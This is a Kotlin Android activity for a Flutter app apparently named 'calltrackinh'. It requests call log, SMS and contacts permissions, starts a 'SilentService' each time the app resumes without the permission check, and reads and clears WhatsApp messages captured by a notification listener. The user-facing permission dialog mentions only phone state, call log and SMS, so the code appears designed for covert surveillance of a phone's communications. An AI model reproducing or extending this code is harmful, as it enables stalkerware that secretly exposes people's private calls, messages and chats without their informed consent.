package com.example.calltrackinh

import io.flutter.embedding.android.FlutterActivity
import android.content.Intent
import android.Manifest
import android.app.ActivityManager
import android.content.Context
import android.content.SharedPreferences
import android.content.pm.PackageManager
import android.os.Build
import android.util.Log
import android.widget.Toast
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import com.google.gson.Gson
import com.google.gson.reflect.TypeToken
import io.flutter.embedding.engine.FlutterEngine
import io.flutter.plugin.common.MethodChannel

class MainActivity: FlutterActivity(){
    private val CHANNEL = "com.example.app/service"
    private val REQUEST_CODE_PERMISSIONS = 1001

    // List of permissions to check
    private val permissions = arrayOf(
        Manifest.permission.READ_PHONE_STATE,
        Manifest.permission.READ_CALL_LOG,
        Manifest.permission.RECEIVE_SMS,
        Manifest.permission.READ_SMS,
        Manifest.permission.READ_CONTACTS
        )


    override fun configureFlutterEngine(flutterEngine: FlutterEngine) {
        super.configureFlutterEngine(flutterEngine)

        MethodChannel(flutterEngine.dartExecutor.binaryMessenger, CHANNEL).setMethodCallHandler { call, result ->
            when (call.method) {
                "checkPermissions" -> {
                    // Check if all permissions are granted
                    if (arePermissionsGranted()) {
                        result.success(true)
                    } else {
                        result.success(false)
                    }
                }
                "stopService" -> {
                    try {
                        val serviceIntent = Intent(this, SilentService::class.java)
                        stopService(serviceIntent)
                        result.success("Service stopped successfully")
                    } catch (e: Exception) {
                        result.error("SERVICE_ERROR", "Failed to stop the silent service: ${e.message}", null)
                    }
                }
                "startSilentService" -> {
                    try {
//                          startSilentService(this)
                        val serviceIntent = Intent(this, SilentService::class.java)
                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                            startForegroundService(serviceIntent)
                        } else {
                            startService(serviceIntent)
                        }
                        result.success("Service started successfully")
                    } catch (e: Exception) {
                        result.error("SERVICE_ERROR", "Failed to start the silent service: ${e.message}", null)
                    }
                }
                "checkNotificationPermission" -> {
                    val enabledListeners = android.provider.Settings.Secure.getString(
                        contentResolver,
                        "enabled_notification_listeners"
                    )

                    val packageName = packageName
                    val isEnabled = enabledListeners != null && enabledListeners.contains(packageName)

                    result.success(isEnabled)
                }
                "openNotificationSettings" -> {
                    try {
                        val intent = Intent("android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS")
                        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                        startActivity(intent)
                        result.success("Opened notification settings")
                    } catch (e: Exception) {
                        result.error("ERROR", "Failed to open settings: ${e.message}", null)
                    }
                }
                "getLocalWhatsappMessages" -> {
                    try {
                        val messages = getWhatsappMessages(this)

                        val resultList = messages.map {
                            mapOf(
                                "id" to it.id,
                                "sender" to it.sender,
                                "message" to it.message,
                                "type" to it.type,
                                "timestamp" to it.timestamp
                            )
                        }

                        result.success(resultList)
                    } catch (e: Exception) {
                        result.error("ERROR", "Failed to fetch messages: ${e.message}", null)
                    }
                }

                "clearLocalWhatsappMessages" -> {
                    try {
                        clearWhatsappMessages(this)
                        result.success("Messages cleared")
                    } catch (e: Exception) {
                        result.error("ERROR", "Failed to clear messages: ${e.message}", null)
                    }
                }
                else -> result.notImplemented()
            }
        }
    }


    private fun getWhatsappMessages(context: Context): List<WhatsappNotificationListener.WhatsappMessage> {
        val sharedPreferences =
            context.getSharedPreferences("WhatsappLocalDB", Context.MODE_PRIVATE)

        val gson = Gson()
        val json = sharedPreferences.getString("messages", null)

        val type = object : TypeToken<List<WhatsappNotificationListener.WhatsappMessage>>() {}.type

        return if (json != null) gson.fromJson(json, type) else emptyList()
    }


    private fun clearWhatsappMessages(context: Context) {
        val sharedPreferences =
            context.getSharedPreferences("WhatsappLocalDB", Context.MODE_PRIVATE)

        sharedPreferences.edit().clear().apply()

        Log.d("LocalStorage", "All messages cleared")
    }


//    fun startSilentService(context: Context) {
//        val serviceIntent = Intent(context, SilentService::class.java)
//
//        if (!isServiceRunning(context, SilentService::class.java)) {
//            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
//                Log.d("ServiceCheck", "SilentService in iffff")
//                context.startForegroundService(serviceIntent)
//            } else {
//                Log.d("ServiceCheck", "SilentService in elseeee")
//                context.startService(serviceIntent)
//            }
//            Log.d("ServiceCheck", "Service started.")
//        } else {
//            Log.d("ServiceCheck", "Service is already running.")
//        }
//    }

    private fun arePermissionsGranted(): Boolean {
        // Check if all permissions are granted
        for (permission in permissions) {
            if (ContextCompat.checkSelfPermission(this, permission) != PackageManager.PERMISSION_GRANTED) {
                return false
            }
        }
        return true
    }

    private fun requestPermissions() {
        // Show a dialog to ask for permissions
        val builder = android.app.AlertDialog.Builder(this)
        builder.setTitle("Permissions Required")
            .setMessage("To use this app, we need the following permissions: Phone State, Call Log, and SMS.")
            .setCancelable(false)
            .setPositiveButton("Allow") { dialog, id ->
                // Request the permissions
                ActivityCompat.requestPermissions(this, permissions, REQUEST_CODE_PERMISSIONS)
            }
            .setNegativeButton("Disallow") { dialog, id ->
                // Show a message if the user denies the permissions
                Toast.makeText(this, "Permissions are required to start the service.", Toast.LENGTH_SHORT).show()
                dialog.dismiss()
            }

        val dialog = builder.create()
        dialog.show()
    }

    override fun onRequestPermissionsResult(requestCode: Int, permissions: Array<out String>, grantResults: IntArray) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        if (requestCode == REQUEST_CODE_PERMISSIONS) {
            var allPermissionsGranted = true
            for (result in grantResults) {
                if (result != PackageManager.PERMISSION_GRANTED) {
                    allPermissionsGranted = false
                    break
                }
            }

            if (allPermissionsGranted) {
//                 Permissions granted, start the service
//                val serviceIntent = Intent(this, SilentService::class.java)
//                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
//                    startForegroundService(serviceIntent)
//                } else {
//                    startService(serviceIntent)
//                }
            } else {
                // If any permission is denied, show a toast message
                Toast.makeText(this, "Permissions are not granted.", Toast.LENGTH_LONG).show()
            }
        }
    }


    private fun getUserDataFromNative(context: Context): Map<String, String>? {
        val sharedPreferences: SharedPreferences = context.getSharedPreferences("FlutterSharedPrefs", MODE_PRIVATE)
        val userId = sharedPreferences.getString("userId", null)
        val username = sharedPreferences.getString("username", null)

        return if (userId != null && username != null) {
            mapOf("userId" to userId, "username" to username)
        } else {
            null
        }
    }
    override fun onResume() {
        super.onResume()
        // If permissions are not granted, show the permission request dialog
//        if (!arePermissionsGranted()) {
//            requestPermissions()
//        }else {
//            val userData = getUserDataFromNative(context)
//            if (userData!= null) {
                try {
                    val serviceIntent = Intent(this, SilentService::class.java)
                    stopService(serviceIntent)
                } catch (e: Exception) {
                    Log.e("ServiceCheck", "Failed to stop the silent service: ${e.message}")
                }


                    try {
//                          startSilentService(this)
                        val serviceIntent = Intent(this, SilentService::class.java)
                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                            startForegroundService(serviceIntent)
                        } else {
                            startService(serviceIntent)
                        }
                        Log.d("ServiceCheck", "Service started.]12]1[2]1[][32]3[2[2[43]23[4]23[423[4")
                    } catch (e: Exception) {}

//            }
//        }
    }

    private fun isServiceRunning(serviceClass: Class<*>): Boolean {
        val activityManager = applicationContext.getSystemService(ACTIVITY_SERVICE) as ActivityManager
        for (service in activityManager.getRunningServices(Int.MAX_VALUE)) {
            if (serviceClass.name == service.service.className) {
                Log.d("ServiceCheck", "for loopppp true")
                return true
            }
        }
        Log.d("ServiceCheck", "for loopppp false")

        return false
    }
}
